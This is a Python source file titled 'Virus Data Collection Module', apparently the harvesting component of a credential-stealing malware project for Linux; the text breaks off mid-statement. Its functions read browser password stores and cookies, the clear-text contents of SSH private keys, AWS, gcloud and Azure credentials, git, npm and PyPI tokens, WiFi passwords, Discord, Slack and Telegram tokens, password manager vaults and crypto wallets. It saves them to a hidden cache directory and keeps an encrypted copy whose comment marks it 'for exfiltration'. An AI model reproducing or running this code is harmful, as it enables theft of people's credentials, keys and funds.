"""
Virus Data Collection Module
"""
import os
import datetime
import time
import subprocess
import base64
import hashlib
import json
import sys

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

from virus_config import *
from virus_utils import log_activity, encrypt_data

def collect_passwords():
    """Collect saved passwords from browsers"""
    if not ENABLE_PASSWORD_COLLECTION:
        return []
    
    passwords = []
    home_dir = os.path.expanduser("~")
    
    # Extended browser paths
    browser_paths = [
        f"{home_dir}/.mozilla/firefox",
        f"{home_dir}/.config/google-chrome",
        f"{home_dir}/.config/chromium",
        f"{home_dir}/.config/brave",
        f"{home_dir}/.config/microsoft-edge",
        f"{home_dir}/.firedragon",
        f"{home_dir}/.config/falkon",
        f"{home_dir}/.config/librewolf",
        f"{home_dir}/.config/waterfox",
    ]
    
    # Keywords to search for in filenames
    password_keywords = ['login', 'signons', 'password', 'credentials', 'key4db', 'key3.db', 'logins.json']
    
    for browser_path in browser_paths:
        if not os.path.exists(browser_path):
            continue
            
        try:
            for root, dirs, files in os.walk(browser_path):
                # Skip cache and temporary directories
                dirs[:] = [d for d in dirs if d not in ['Cache', 'cache', 'crashes', 'Crash Reports']]
                
                for file in files:
                    file_lower = file.lower()
                    
                    # Check if file matches password-related keywords
                    if any(keyword in file_lower for keyword in password_keywords):
                        file_path = os.path.join(root, file)
                        try:
                            file_stat = os.stat(file_path)
                            
                            # Read file data (up to 10KB for analysis)
                            data = None
                            try:
                                with open(file_path, 'rb') as f:
                                    data = f.read(min(10240, file_stat.st_size))
                            except:
                                pass
                            
                            passwords.append({
                                'browser': os.path.basename(browser_path),
                                'file': file_path,
                                'size': file_stat.st_size,
                                'modified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat(),
                                'hash': hashlib.md5(data).hexdigest() if data else None,
                                'type': 'sqlite' if file.endswith('.sqlite') else 'json' if file.endswith('.json') else 'database'
                            })
                        except (OSError, PermissionError):
                            pass
        except Exception as e:
            log_activity("ERROR", f"Error collecting passwords from {browser_path}: {e}")
            pass
    
    if passwords:
        log_activity("PASSWORDS", f"Found {len(passwords)} password database files")
    
    return passwords

def collect_sensitive_files():
    """Collect sensitive files (SSH keys, configs, etc.)"""
    if not ENABLE_FILE_COLLECTION:
        return []
    
    sensitive_files = []
    home_dir = os.path.expanduser("~")
    
    patterns = [
        # SSH keys (all types)
        f"{home_dir}/.ssh/id_rsa",
        f"{home_dir}/.ssh/id_ed25519",
        f"{home_dir}/.ssh/id_ecdsa",
        f"{home_dir}/.ssh/id_dsa",
        f"{home_dir}/.ssh/id_rsa.pub",
        f"{home_dir}/.ssh/id_ed25519.pub",
        f"{home_dir}/.ssh/id_ecdsa.pub",
        f"{home_dir}/.ssh/id_dsa.pub",
        f"{home_dir}/.ssh/known_hosts",
        f"{home_dir}/.ssh/config",
        f"{home_dir}/.ssh/authorized_keys",
        # Shell history
        f"{home_dir}/.bash_history",
        f"{home_dir}/.zsh_history",
        f"{home_dir}/.fish_history",
        f"{home_dir}/.history",
        # Cloud credentials
        f"{home_dir}/.aws/credentials",
        f"{home_dir}/.aws/config",
        f"{home_dir}/.config/gcloud/credentials",
        f"{home_dir}/.config/gcloud/legacy_credentials",
        f"{home_dir}/.azure/config",
        f"{home_dir}/.azure/accessTokens.json",
        # Git credentials
        f"{home_dir}/.config/git/credentials",
        f"{home_dir}/.git-credentials",
        # Docker/Kubernetes
        f"{home_dir}/.docker/config.json",
        f"{home_dir}/.kube/config",
        # GPG keys
        f"{home_dir}/.gnupg/secring.gpg",
        f"{home_dir}/.gnupg/pubring.gpg",
        f"{home_dir}/.gnupg/private-keys-v1.d",
        # Development tool tokens
        f"{home_dir}/.npmrc",
        f"{home_dir}/.yarnrc",
        f"{home_dir}/.pypirc",
        f"{home_dir}/.pip/pip.conf",
        # Password managers
        f"{home_dir}/.config/keepassxc",
        f"{home_dir}/.local/share/keepassxc",
        f"{home_dir}/.config/Bitwarden",
        # Application tokens
        f"{home_dir}/.config/discord",
        f"{home_dir}/.config/TelegramDesktop",
        f"{home_dir}/.config/Slack",
        # Cloud storage
        f"{home_dir}/.dropbox",
        f"{home_dir}/.config/dropbox",
        f"{home_dir}/.config/onedrive",
        f"{home_dir}/.config/megasync",
    ]
    
    for pattern in patterns:
        if os.path.exists(pattern):
            try:
                file_stat = os.stat(pattern)
                file_data = None
                if file_stat.st_size < 1024 * 1024:  # Less than 1MB
                    try:
                        # Read in CLEAR TEXT (not base64)
                        with open(pattern, 'r', encoding='utf-8', errors='ignore') as f:
                            file_data = f.read()
                    except:
                        # If text read fails, try binary but still show as text
                        try:
                            with open(pattern, 'rb') as f:
                                file_data = f.read().decode('utf-8', errors='ignore')
                        except:
                            pass
                
                # For SSH private keys, read full content even if larger
                if 'id_rsa' in pattern or 'id_ed25519' in pattern or 'id_ecdsa' in pattern or 'id_dsa' in pattern:
                    if not pattern.endswith('.pub'):  # Private keys only
                        if file_stat.st_size < 10 * 1024:  # Up to 10KB for private keys
                            try:
                                with open(pattern, 'r', encoding='utf-8', errors='ignore') as f:
                                    file_data = f.read()
                            except:
                                try:
                                    with open(pattern, 'rb') as f:
                                        file_data = f.read().decode('utf-8', errors='ignore')
                                except:
                                    pass
                
                sensitive_files.append({
                    'path': pattern,
                    'size': file_stat.st_size,
                    'modified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat(),
                    'content': file_data,  # CLEAR TEXT content
                    'hash': hashlib.sha256(file_data.encode('utf-8') if file_data else b'').hexdigest() if file_data else None
                })
            except:
                pass
    
    if sensitive_files:
        log_activity("FILES", f"Found {len(sensitive_files)} sensitive files")
    
    return sensitive_files

def collect_browser_data():
    """Collect comprehensive browser data"""
    browser_data = {
        'cookies': [],
        'bookmarks': [],
        'history': [],
        'autofill': [],
        'extensions': []
    }
    
    home_dir = os.path.expanduser("~")
    browsers = {
        'firefox': f"{home_dir}/.mozilla/firefox",
        'chrome': f"{home_dir}/.config/google-chrome",
        'chromium': f"{home_dir}/.config/chromium",
        'brave': f"{home_dir}/.config/brave",
        'edge': f"{home_dir}/.config/microsoft-edge",
    }
    
    for browser_name, browser_path in browsers.items():
        if not os.path.exists(browser_path):
            continue
        
        try:
            for root, dirs, files in os.walk(browser_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        if 'cookies' in file.lower() and file.endswith('.sqlite'):
                            browser_data['cookies'].append({
                                'browser': browser_name,
                                'file': file_path,
                                'size': os.path.getsize(file_path)
                            })
                        elif 'places.sqlite' in file or 'History' in file:
                            browser_data['history'].append({
                                'browser': browser_name,
                                'file': file_path,
                                'size': os.path.getsize(file_path)
                            })
                        elif 'bookmarks' in file.lower():
                            browser_data['bookmarks'].append({
                                'browser': browser_name,
                                'file': file_path,
                                'size': os.path.getsize(file_path)
                            })
                        elif 'web data' in file.lower() or 'formhistory' in file.lower():
                            browser_data['autofill'].append({
                                'browser': browser_name,
                                'file': file_path,
                                'size': os.path.getsize(file_path)
                            })
                    except:
                        pass
        except:
            pass
    
    if any(browser_data.values()):
        log_activity("BROWSER", f"Found browser data: {sum(len(v) for v in browser_data.values())} items")
    
    return browser_data

def collect_wifi_passwords():
    """Collect WiFi passwords"""
    wifi_data = []
    
    try:
        result = subprocess.run(['nmcli', '-t', '-f', 'NAME', 'connection', 'show'],
                              stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=5)
        if result.returncode == 0:
            connections = result.stdout.decode().strip().split('\n')
            for conn in connections:
                if conn:
                    try:
                        result2 = subprocess.run(['nmcli', '-s', 'connection', 'show', conn],
                                               stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=2)
                        if result2.returncode == 0:
                            output = result2.stdout.decode()
                            if '802-11-wireless' in output or 'wifi' in output.lower():
                                wifi_data.append({
                                    'ssid': conn,
                                    'config': output[:500]
                                })
                    except:
                        pass
    except:
        pass
    
    try:
        wpa_config = '/etc/wpa_supplicant/wpa_supplicant.conf'
        if os.path.exists(wpa_config):
            try:
                with open(wpa_config, 'r') as f:
                    content = f.read()
                    wifi_data.append({
                        'source': 'wpa_supplicant',
                        'config': content
                    })
            except:
                pass
    except:
        pass
    
    if wifi_data:
        log_activity("WIFI", f"Found {len(wifi_data)} WiFi configurations")
    
    return wifi_data

def collect_email_configs():
    """Collect email client configurations"""
    email_configs = []
    home_dir = os.path.expanduser("~")
    
    thunderbird_path = f"{home_dir}/.thunderbird"
    if os.path.exists(thunderbird_path):
        try:
            for root, dirs, files in os.walk(thunderbird_path):
                for file in files:
                    if file.endswith('.js') or 'prefs.js' in file:
                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                if 'mail' in content.lower() or 'smtp' in content.lower():
                                    email_configs.append({
                                        'client': 'thunderbird',
                                        'file': file_path,
                                        'content': content[:2000]
                                    })
                        except:
                            pass
        except:
            pass
    
    evolution_path = f"{home_dir}/.config/evolution"
    if os.path.exists(evolution_path):
        email_configs.append({
            'client': 'evolution',
            'path': evolution_path
        })
    
    if email_configs:
        log_activity("EMAIL", f"Found {len(email_configs)} email configurations")
    
    return email_configs

def collect_database_files():
    """Collect database files including MongoDB, SQLite, and other databases"""
    databases = []
    home_dir = os.path.expanduser("~")
    
    # Common database locations
    database_locations = [
        home_dir,
        f"{home_dir}/.config",
        f"{home_dir}/.local/share",
        f"{home_dir}/.cache",
        f"{home_dir}/Documents",
        f"{home_dir}/Downloads",
    ]
    
    # Also check browser directories specifically
    browser_dirs = [
        f"{home_dir}/.mozilla/firefox",
        f"{home_dir}/.config/google-chrome",
        f"{home_dir}/.config/chromium",
        f"{home_dir}/.config/brave",
        f"{home_dir}/.firedragon",
        f"{home_dir}/.config/falkon",
    ]
    
    # MongoDB specific locations
    mongodb_locations = [
        f"{home_dir}/.mongodb",
        f"{home_dir}/data/db",
        f"{home_dir}/mongodb/data",
        f"{home_dir}/.local/share/mongodb",
        "/var/lib/mongodb",  # System-wide MongoDB (may need permissions)
    ]
    
    database_locations.extend(browser_dirs)
    database_locations.extend(mongodb_locations)
    
    # Exclude these directories to avoid too many results
    exclude_dirs = {
        '.git', '.svn', '.hg', 'node_modules', '__pycache__',
        '.cache', '.local/share/Trash', '.local/share/Steam'
    }
    
    # Database file extensions
    sqlite_extensions = ('.db', '.sqlite', '.sqlite3', '.db3')
    mongodb_extensions = ('.bson', '.wt', '.wiredtiger')
    other_db_extensions = ('.mdb', '.accdb', '.fdb', '.gdb')
    all_db_extensions = sqlite_extensions + mongodb_extensions + other_db_extensions
    
    max_depth = 3  # Limit depth to avoid too deep recursion
    max_files = 200  # Increased limit for more databases
    mongodb_max_size = 500 * 1024 * 1024  # 500MB for MongoDB files
    sqlite_max_size = 50 * 1024 * 1024  # 50MB for SQLite
    
    try:
        for location in database_locations:
            if not os.path.exists(location):
                continue
                
            for root, dirs, files in os.walk(location):
                # Calculate depth
                depth = root[len(location):].count(os.sep) if root != location else 0
                if depth > max_depth:
                    dirs[:] = []  # Don't go deeper
                    continue
                
                # Filter out excluded directories
                dirs[:] = [d for d in dirs if d not in exclude_dirs]
                
                for file in files:
                    if len(databases) >= max_files:
                        break
                    
                    file_path = os.path.join(root, file)
                    db_type = None
                    max_size = sqlite_max_size
                    
                    # Determine database type
                    if file.endswith(sqlite_extensions):
                        db_type = 'sqlite'
                        max_size = sqlite_max_size
                    elif file.endswith(mongodb_extensions):
                        db_type = 'mongodb'
                        max_size = mongodb_max_size
                    elif file.endswith(other_db_extensions):
                        db_type = 'other'
                        max_size = 100 * 1024 * 1024
                    elif any(loc in location for loc in mongodb_locations):
                        # In MongoDB directory, check for MongoDB files
                        if file.endswith(('.ns', '.0', '.1', '.2')) or 'collection' in file.lower():
                            db_type = 'mongodb'
                            max_size = mongodb_max_size
                    
                    if db_type:
                        try:
                            file_stat = os.stat(file_path)
                            if file_stat.st_size < max_size:
                                databases.append({
                                    'path': file_path,
                                    'size': file_stat.st_size,
                                    'modified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat(),
                                    'type': db_type,
                                    'location': location
                                })
                        except (OSError, PermissionError):
                            pass
                
                if len(databases) >= max_files:
                    break
            
            if len(databases) >= max_files:
                break
        
        # Also look for MongoDB config files
        mongodb_config_paths = [
            f"{home_dir}/.mongodb",
            f"{home_dir}/.config/mongodb",
            "/etc/mongod.conf",
            "/etc/mongodb.conf",
        ]
        
        for config_path in mongodb_config_paths:
            if os.path.exists(config_path):
                try:
                    if os.path.isfile(config_path):
                        # It's a config file
                        try:
                            file_stat = os.stat(config_path)
                            if file_stat.st_size < 1024 * 1024:  # < 1MB
                                with open(config_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    databases.append({
                                        'path': config_path,
                                        'size': file_stat.st_size,
                                        'modified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat(),
                                        'type': 'mongodb_config',
                                        'content': content[:5000],
                                        'location': 'config'
                                    })
                        except (OSError, PermissionError):
                            pass
                    else:
                        # It's a directory, look for config files inside
                        for root, dirs, files in os.walk(config_path):
                            for file in files:
                                if file.endswith(('.conf', '.config', '.yaml', '.yml')) and 'mongo' in file.lower():
                                    file_path = os.path.join(root, file)
                                    try:
                                        file_stat = os.stat(file_path)
                                        if file_stat.st_size < 1024 * 1024:
                                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                                content = f.read()
                                                databases.append({
                                                    'path': file_path,
                                                    'size': file_stat.st_size,
                                                    'modified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat(),
                                                    'type': 'mongodb_config',
                                                    'content': content[:5000],
                                                    'location': 'config'
                                                })
                                    except (OSError, PermissionError):
                                        pass
                except Exception as e:
                    pass
                    
    except Exception as e:
        log_activity("ERROR", f"Error collecting databases: {e}")
    
    if databases:
        mongodb_count = sum(1 for db in databases if db.get('type') == 'mongodb' or db.get('type') == 'mongodb_config')
        log_activity("DATABASES", f"Found {len(databases)} database files (including {mongodb_count} MongoDB files)")
    
    return databases

def collect_crypto_wallets():
    """Collect cryptocurrency wallet files"""
    wallets = []
    home_dir = os.path.expanduser("~")
    
    wallet_paths = [
        f"{home_dir}/.bitcoin",
        f"{home_dir}/.ethereum",
        f"{home_dir}/.electrum",
        f"{home_dir}/.monero",
        f"{home_dir}/.zcash",
    ]
    
    for wallet_path in wallet_paths:
        if os.path.exists(wallet_path):
            try:
                for root, dirs, files in os.walk(wallet_path):
                    for file in files:
                        if 'wallet' in file.lower() or file.endswith(('.dat', '.key', '.wallet')):
                            file_path = os.path.join(root, file)
                            try:
                                file_stat = os.stat(file_path)
                                wallets.append({
                                    'type': os.path.basename(wallet_path),
                                    'file': file_path,
                                    'size': file_stat.st_size
                                })
                            except:
                                pass
            except:
                pass
    
    if wallets:
        log_activity("WALLETS", f"Found {len(wallets)} cryptocurrency wallet files")
    
    return wallets

def collect_application_tokens():
    """Collect tokens from applications (Discord, Telegram, Slack, etc.)"""
    tokens = []
    home_dir = os.path.expanduser("~")
    
    # Discord tokens
    discord_paths = [
        f"{home_dir}/.config/discord",
        f"{home_dir}/.config/discordcanary",
        f"{home_dir}/.config/discordptb",
    ]
    
    for discord_path in discord_paths:
        if os.path.exists(discord_path):
            try:
                # Look for Local Storage (LevelDB) or token files
                for root, dirs, files in os.walk(discord_path):
                    for file in files:
                        if 'token' in file.lower() or 'local storage' in root.lower():
                            file_path = os.path.join(root, file)
                            try:
                                if os.path.getsize(file_path) < 1024 * 1024:  # < 1MB
                                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                        content = f.read()
                                        if 'token' in content.lower() or len(content) > 50:
                                            tokens.append({
                                                'app': 'discord',
                                                'file': file_path,
                                                'content': content[:2000]
                                            })
                            except:
                                pass
            except:
                pass
    
    # Telegram
    telegram_paths = [
        f"{home_dir}/.local/share/TelegramDesktop",
        f"{home_dir}/.config/TelegramDesktop",
    ]
    
    for telegram_path in telegram_paths:
        if os.path.exists(telegram_path):
            try:
                for root, dirs, files in os.walk(telegram_path):
                    for file in files:
                        if file.endswith(('.key', '.dbs', '.tdata')):
                            file_path = os.path.join(root, file)
                            tokens.append({
                                'app': 'telegram',
                                'file': file_path,
                                'size': os.path.getsize(file_path) if os.path.exists(file_path) else 0
                            })
            except:
                pass
    
    # Slack
    slack_path = f"{home_dir}/.config/Slack"
    if os.path.exists(slack_path):
        try:
            for root, dirs, files in os.walk(slack_path):
                for file in files:
                    if 'token' in file.lower() or 'local storage' in root.lower():
                        file_path = os.path.join(root, file)
                        try:
                            if os.path.getsize(file_path) < 1024 * 1024:
                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    if 'token' in content.lower():
                                        tokens.append({
                                            'app': 'slack',
                                            'file': file_path,
                                            'content': content[:2000]
                                        })
                        except:
                            pass
        except:
            pass
    
    if tokens:
        log_activity("TOKENS", f"Found {len(tokens)} application token files")
    
    return tokens

def collect_cloud_storage_configs():
    """Collect cloud storage configurations"""
    cloud_configs = []
    home_dir = os.path.expanduser("~")
    
    # Dropbox
    dropbox_paths = [
        f"{home_dir}/.dropbox",
        f"{home_dir}/.config/dropbox",
    ]
    
    for dropbox_path in dropbox_paths:
        if os.path.exists(dropbox_path):
            try:
                for root, dirs, files in os.walk(dropbox_path):
                    for file in files:
                        if 'config' in file.lower() or file.endswith('.json'):
                            file_path = os.path.join(root, file)
                            try:
                                if os.path.getsize(file_path) < 1024 * 1024:
                                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                        content = f.read()
                                        cloud_configs.append({
                                            'service': 'dropbox',
                                            'file': file_path,
                                            'content': content[:5000]
                                        })
                            except:
                                pass
            except:
                pass
    
    # OneDrive
    onedrive_path = f"{home_dir}/.config/onedrive"
    if os.path.exists(onedrive_path):
        try:
            config_file = os.path.join(onedrive_path, 'config')
            if os.path.exists(config_file):
                with open(config_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    cloud_configs.append({
                        'service': 'onedrive',
                        'file': config_file,
                        'content': content
                    })
        except:
            pass
    
    # MegaSync
    megasync_path = f"{home_dir}/.config/megasync"
    if os.path.exists(megasync_path):
        try:
            for root, dirs, files in os.walk(megasync_path):
                for file in files:
                    if 'config' in file.lower() or file.endswith('.ini'):
                        file_path = os.path.join(root, file)
                        try:
                            if os.path.getsize(file_path) < 1024 * 1024:
                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    cloud_configs.append({
                                        'service': 'megasync',
                                        'file': file_path,
                                        'content': content[:5000]
                                    })
                        except:
                            pass
        except:
            pass
    
    if cloud_configs:
        log_activity("CLOUD", f"Found {len(cloud_configs)} cloud storage configurations")
    
    return cloud_configs

def collect_development_tokens():
    """Collect development tool tokens and credentials"""
    dev_tokens = []
    home_dir = os.path.expanduser("~")
    
    # NPM tokens
    npmrc_path = f"{home_dir}/.npmrc"
    if os.path.exists(npmrc_path):
        try:
            with open(npmrc_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                if 'token' in content.lower() or 'auth' in content.lower():
                    dev_tokens.append({
                        'tool': 'npm',
                        'file': npmrc_path,
                        'content': content
                    })
        except:
            pass
    
    # Git credentials
    git_cred_paths = [
        f"{home_dir}/.git-credentials",
        f"{home_dir}/.config/git/credentials",
    ]
    
    for git_path in git_cred_paths:
        if os.path.exists(git_path):
            try:
                with open(git_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    if content.strip():
                        dev_tokens.append({
                            'tool': 'git',
                            'file': git_path,
                            'content': content
                        })
            except:
                pass
    
    # PyPI tokens
    pypirc_path = f"{home_dir}/.pypirc"
    if os.path.exists(pypirc_path):
        try:
            with open(pypirc_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                dev_tokens.append({
                    'tool': 'pypi',
                    'file': pypirc_path,
                    'content': content
                })
        except:
            pass
    
    # Pip config
    pip_config_path = f"{home_dir}/.pip/pip.conf"
    if os.path.exists(pip_config_path):
        try:
            with open(pip_config_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                if 'token' in content.lower() or 'password' in content.lower():
                    dev_tokens.append({
                        'tool': 'pip',
                        'file': pip_config_path,
                        'content': content
                    })
        except:
            pass
    
    if dev_tokens:
        log_activity("DEV_TOKENS", f"Found {len(dev_tokens)} development tool tokens")
    
    return dev_tokens

def collect_password_manager_files():
    """Collect password manager database files"""
    pm_files = []
    home_dir = os.path.expanduser("~")
    
    # Password manager locations and patterns
    pm_locations = [
        # KeePassXC
        {
            'manager': 'keepassxc',
            'paths': [
                f"{home_dir}/.config/keepassxc",
                f"{home_dir}/.local/share/keepassxc",
                f"{home_dir}/Documents",
                f"{home_dir}/Downloads",
            ],
            'extensions': ('.kdbx', '.kdb', '.key'),
            'max_size': 100 * 1024 * 1024  # 100MB
        },
        # Bitwarden
        {
            'manager': 'bitwarden',
            'paths': [
                f"{home_dir}/.config/Bitwarden",
                f"{home_dir}/.local/share/Bitwarden",
            ],
            'extensions': ('.db', '.sqlite', '.sqlite3', '.json'),
            'max_size': 50 * 1024 * 1024  # 50MB
        },
        # 1Password
        {
            'manager': '1password',
            'paths': [
                f"{home_dir}/.config/1Password",
                f"{home_dir}/.local/share/1Password",
            ],
            'extensions': ('.opvault', '.agilekeychain', '.1pif'),
            'max_size': 200 * 1024 * 1024  # 200MB
        },
        # LastPass
        {
            'manager': 'lastpass',
            'paths': [
                f"{home_dir}/.config/lastpass",
                f"{home_dir}/.local/share/lastpass",
            ],
            'extensions': ('.lps', '.lpsx'),
            'max_size': 50 * 1024 * 1024
        },
        # Generic password files (search in common locations)
        {
            'manager': 'generic',
            'paths': [
                f"{home_dir}/Documents",
                f"{home_dir}/Downloads",
                f"{home_dir}/Desktop",
            ],
            'extensions': ('.kdbx', '.kdb', '.pws', '.psafe3'),
            'max_size': 100 * 1024 * 1024
        }
    ]
    
    for pm_config in pm_locations:
        manager = pm_config['manager']
        paths = pm_config['paths']
        extensions = pm_config['extensions']
        max_size = pm_config['max_size']
        
        for path in paths:
            if not os.path.exists(path):
                continue
            
            try:
                # For Documents/Downloads/Desktop, limit depth to avoid too many files
                max_depth = 2 if path in [f"{home_dir}/Documents", f"{home_dir}/Downloads", f"{home_dir}/Desktop"] else 5
                depth = 0
                
                for root, dirs, files in os.walk(path):
                    # Calculate depth
                    if path != root:
                        depth = root[len(path):].count(os.sep)
                        if depth > max_depth:
                            dirs[:] = []
                            continue
                    
                    for file in files:
                        if file.endswith(extensions):
                            file_path = os.path.join(root, file)
                            try:
                                file_stat = os.stat(file_path)
                                
                                # Check size limit
                                if file_stat.st_size > max_size:
                                    continue
                                
                                # Skip if already found (avoid duplicates)
                                if any(pm['file'] == file_path for pm in pm_files):
                                    continue
                                
                                pm_files.append({
                                    'manager': manager,
                                    'file': file_path,
                                    'size': file_stat.st_size,
                                    'modified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat(),
                                    'extension': os.path.splitext(file)[1]
                                })
                            except (OSError, PermissionError):
                                pass
            except Exception as e:
                log_activity("ERROR", f"Error collecting {manager} files from {path}: {e}")
                pass
    
    if pm_files:
        log_activity("PASSWORD_MANAGERS", f"Found {len(pm_files)} password manager files")
    
    return pm_files

def collect_all_config_files():
    """Collect all important config files from ~/.config/"""
    config_files = []
    home_dir = os.path.expanduser("~")
    config_dir = f"{home_dir}/.config"
    
    if not os.path.exists(config_dir):
        return config_files
    
    # File extensions to collect
    config_extensions = ('.json', '.conf', '.config', '.ini', '.yaml', '.yml', '.toml', '.cfg', '.cnf')
    
    # Keywords in filenames that indicate sensitive configs
    sensitive_keywords = [
        'token', 'credential', 'password', 'secret', 'key', 'auth', 'api',
        'config', 'setting', 'preference', 'account', 'login', 'session'
    ]
    
    # Directories to exclude (too large or not useful)
    exclude_dirs = {
        '.cache', 'cache', 'Cache', '__pycache__', 'node_modules',
        '.git', '.svn', 'Trash', 'Steam', 'discord', 'discordcanary', 'discordptb',
        'Code', 'code', 'Cursor', 'cursor'  # Already handled separately
    }
    
    max_file_size = 1024 * 1024  # 1MB max per file
    max_files = 200  # Limit total files
    
    try:
        for root, dirs, files in os.walk(config_dir):
            # Filter out excluded directories
            dirs[:] = [d for d in dirs if d not in exclude_dirs and not d.startswith('.')]
            
            for file in files:
                if len(config_files) >= max_files:
                    break
                
                file_path = os.path.join(root, file)
                
                # Check if file matches our criteria
                should_collect = False
                
                # Check extension
                if file.endswith(config_extensions):
                    should_collect = True
                
                # Check if filename contains sensitive keywords
                if not should_collect:
                    file_lower = file.lower()
                    if any(keyword in file_lower for keyword in sensitive_keywords):
                        should_collect = True
                
                if should_collect:
                    try:
                        file_stat = os.stat(file_path)
                        
                        # Skip if too large
                        if file_stat.st_size > max_file_size:
                            continue
                        
                        # Try to read file content
                        file_content = None
                        try:
                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                file_content = f.read()
                        except:
                            # If text read fails, try binary
                            try:
                                with open(file_path, 'rb') as f:
                                    file_content = f.read().decode('utf-8', errors='ignore')
                            except:
                                pass
                        
                        # Only add if we got content or it's a small file
                        if file_content or file_stat.st_size < 10240:  # < 10KB
                            config_files.append({
                                'path': file_path,
                                'size': file_stat.st_size,
                                'modified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat(),
                                'content': file_content[:10000] if file_content else None,  # Limit content to 10KB
                                'relative_path': file_path.replace(config_dir + '/', '')
                            })
                    except (OSError, PermissionError):
                        pass
            
            if len(config_files) >= max_files:
                break
    except Exception as e:
        log_activity("ERROR", f"Error collecting config files: {e}")
    
    if config_files:
        log_activity("CONFIG_FILES", f"Found {len(config_files)} config files from ~/.config/")
    
    return config_files

def collect_recent_documents():
    """Collect recent documents and files"""
    recent_files = []
    home_dir = os.path.expanduser("~")
    
    doc_dirs = [
        f"{home_dir}/Documents",
        f"{home_dir}/Downloads",
        f"{home_dir}/Desktop",
    ]
    
    cutoff_time = time.time() - (7 * 24 * 60 * 60)
    
    for doc_dir in doc_dirs:
        if not os.path.exists(doc_dir):
            continue
        
        try:
            for root, dirs, files in os.walk(doc_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        file_stat = os.stat(file_path)
                        if file_stat.st_mtime > cutoff_time:
                            if file_stat.st_size < 1024 * 1024 and file.endswith(('.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx')):
                                recent_files.append({
                                    'path': file_path,
                                    'size': file_stat.st_size,
                                    'modified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat()
                                })
                    except:
                        pass
        except:
            pass
    
    if recent_files:
        log_activity("DOCUMENTS", f"Found {len(recent_files)} recent documents")
    
    return recent_files[:100]

def collect_system_info_comprehensive():
    """Collect comprehensive system information"""
    system_info = {}
    
    try:
        system_info['hostname'] = os.uname().nodename if hasattr(os, 'uname') else 'unknown'
        system_info['user'] = os.getenv('USER', 'unknown')
        system_info['home'] = os.path.expanduser("~")
        
        env_vars = {}
        sensitive_env = ['API_KEY', 'SECRET', 'PASSWORD', 'TOKEN', 'KEY', 'CREDENTIAL']
        for key, value in os.environ.items():
            if any(s in key.upper() for s in sensitive_env):
                env_vars[key] = value[:100] if len(value) < 100 else value[:50] + "..."
        system_info['environment_variables'] = env_vars
        
        if PSUTIL_AVAILABLE:
            try:
                interfaces = psutil.net_if_addrs()
                system_info['network_interfaces'] = {k: [str(addr) for addr in v] for k, v in interfaces.items()}
            except:
                pass
        
        try:
            result = subprocess.run(['dpkg', '-l'], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=5)
            if result.returncode == 0:
                packages = result.stdout.decode().split('\n')[:50]
                system_info['installed_packages'] = packages
        except:
            try:
                result = subprocess.run(['pacman', '-Q'], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=5)
                if result.returncode == 0:
                    packages = result.stdout.decode().split('\n')[:50]
                    system_info['installed_packages'] = packages
            except:
                pass
        
        try:
            with open('/proc/uptime', 'r') as f:
                uptime_seconds = float(f.read().split()[0])
                system_info['uptime_seconds'] = uptime_seconds
        except:
            pass
    except:
        pass
    
    log_activity("SYSTEM_INFO", "Comprehensive system information collected")
    return system_info

def save_all_collected_data():
    """Collect and save ALL important data to .system_cache"""
    log_activity("DATA_COLLECTION", "Starting comprehensive data collection...")
    
    all_data = {
        'timestamp': datetime.datetime.now().isoformat(),
        'hostname': os.uname().nodename if hasattr(os, 'uname') else 'unknown',
        'user': os.getenv('USER', 'unknown'),
    }
    
    # Collect all data types
    all_data['passwords'] = collect_passwords()
    all_data['sensitive_files'] = collect_sensitive_files()
    all_data['browser_data'] = collect_browser_data()
    all_data['wifi_passwords'] = collect_wifi_passwords()
    all_data['email_configs'] = collect_email_configs()
    all_data['databases'] = collect_database_files()
    all_data['crypto_wallets'] = collect_crypto_wallets()
    all_data['recent_documents'] = collect_recent_documents()
    all_data['system_info'] = collect_system_info_comprehensive()
    
    # Enhanced data collection
    all_data['application_tokens'] = collect_application_tokens()
    all_data['cloud_storage_configs'] = collect_cloud_storage_configs()
    all_data['development_tokens'] = collect_development_tokens()
    all_data['password_manager_files'] = collect_password_manager_files()
    all_data['config_files'] = collect_all_config_files()
    
    # Save to .system_cache
    try:
        os.makedirs(DATA_DIR, exist_ok=True)
        
        # Save in CLEAR TEXT (primary file - readable)
        data_file = f"{DATA_DIR}/comprehensive_data.json"
        with open(data_file, 'w', encoding='utf-8') as f:
            json.dump(all_data, f, indent=2, default=str, ensure_ascii=False)
        
        # Also save encrypted version (optional, for exfiltration)
        try:
            encrypted_data = encrypt_data(json.dumps(all_data, default=str))
            with open(ENCRYPTED_DATA_FILE, 'w', encoding='utf-8') as f:
                f.write(encrypted_data)
        except:
            pass  # Encryption is optional
        
        summary = {
